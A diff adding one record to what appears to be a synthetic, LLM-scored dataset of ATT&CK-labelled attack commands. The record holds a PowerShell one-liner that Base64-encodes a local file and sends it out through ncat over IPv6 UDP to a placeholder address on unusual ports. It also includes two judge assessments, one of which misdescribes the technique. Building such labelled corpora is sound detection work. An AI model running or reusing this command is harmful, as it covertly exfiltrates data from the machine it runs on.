@@ -1,0 +1,46 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u --source-port 60999 2001:db8:dead:beef::24 57777 --send-only",
+  "explanation": "Exfiltrates over IPv6 UDP using an uncommon fixed source and destination port to avoid typical monitored services. This leverages an alternative medium/protocol from usual C2 channels, consistent with T1011.",
+  "rationale_steps": [
+    "Base64-encode content to blend payload bytes.",
+    "Send via IPv6 UDP with unusual source/destination ports to separate from common traffic."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-40a7ef4f",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "PowerShell assignment and pipeline syntax are valid with balanced quoting and plausible ncat flags, but placing --send-only after the host/port may not be parsed as an option by ncat.",
+        "semantic_score": 3,
+        "semantic_justification": "It base64-encodes a file and sends it via IPv6 UDP from a fixed source port (operational exfiltration), but it does not hide commands within legitimate-looking traffic as described by T1011 Traffic Signaling.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T16:06:17.666889Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Powershell command is perfectly well-formed, with balanced syntax for variable assignment, method calls, and proper piping to ncat.exe using valid flags and arguments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements the claimed intent of exfiltration via an uncommon IPv6 UDP channel with Base64 encoding, directly aligning with T1011's emphasis on covert channels, protocol mimicry, and use of unusual ports to evade monitoring.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T16:06:34.090176Z"
+      }
+    ],
+    "llm_average_syntactic": 4.5,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.25,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
